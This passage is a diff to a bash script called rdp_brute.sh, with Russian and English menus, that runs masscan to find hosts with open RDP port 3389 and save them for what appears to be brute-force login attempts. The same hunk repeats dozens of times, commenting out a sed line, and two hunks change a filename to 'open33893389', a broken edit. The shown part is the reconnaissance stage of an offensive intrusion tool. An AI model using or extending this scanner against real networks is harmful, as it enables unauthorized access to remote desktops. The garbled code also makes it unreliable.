 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9502,7 +9506,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9550,7 +9554,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9599,7 +9603,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9648,7 +9652,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9697,7 +9701,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9746,7 +9750,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9795,7 +9799,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9844,7 +9848,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9892,7 +9896,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9940,7 +9944,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9989,7 +9993,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10037,7 +10041,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10085,7 +10089,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10133,7 +10137,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10181,7 +10185,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10229,7 +10233,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10278,7 +10282,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10326,7 +10330,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10375,7 +10379,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10424,7 +10428,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10465,7 +10469,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -10723,10 +10727,10 @@ echo -e "$yellow*To exit the scan mode $red'CTRL+C'$green"
 masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 echo ""
 echo -e "$aquamarine                             Addresses open RDP port:$green"
-cat open3389
+cat open33893389
 echo ""
 echo -e "$red Hosts open port 3389 written to the file $PWD/open3389"
 echo ""
@@ -10753,10 +10757,10 @@ echo -e "$yellow*To exit the scan mode $red'CTRL+C'$green"
 masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 echo ""
 echo -e "$aquamarine                            Addresses open RDP port:$green" 
-cat open3389
+cat open33893389
 echo ""
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
 echo ""
@@ -10810,7 +10814,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -10853,7 +10857,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -10898,7 +10902,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 
@@ -10945,7 +10949,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -10990,7 +10994,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11036,7 +11040,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11081,7 +11085,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11126,7 +11130,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11170,7 +11174,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11215,7 +11219,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11260,7 +11264,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11305,7 +11309,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11351,7 +11355,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11397,7 +11401,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11443,7 +11447,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11489,7 +11493,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11535,7 +11539,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11581,7 +11585,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11627,7 +11631,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11673,7 +11677,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11719,7 +11723,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11764,7 +11768,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11809,7 +11813,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11854,7 +11858,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11900,7 +11904,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11945,7 +11949,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -11991,7 +11995,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12037,7 +12041,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12083,7 +12087,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12129,7 +12133,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12175,7 +12179,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12221,7 +12225,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12266,7 +12270,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12312,7 +12316,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12357,7 +12361,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12402,7 +12406,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12446,7 +12450,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12492,7 +12496,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12538,7 +12542,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12584,7 +12588,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12630,7 +12634,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12676,7 +12680,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -12722,7 +12726,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
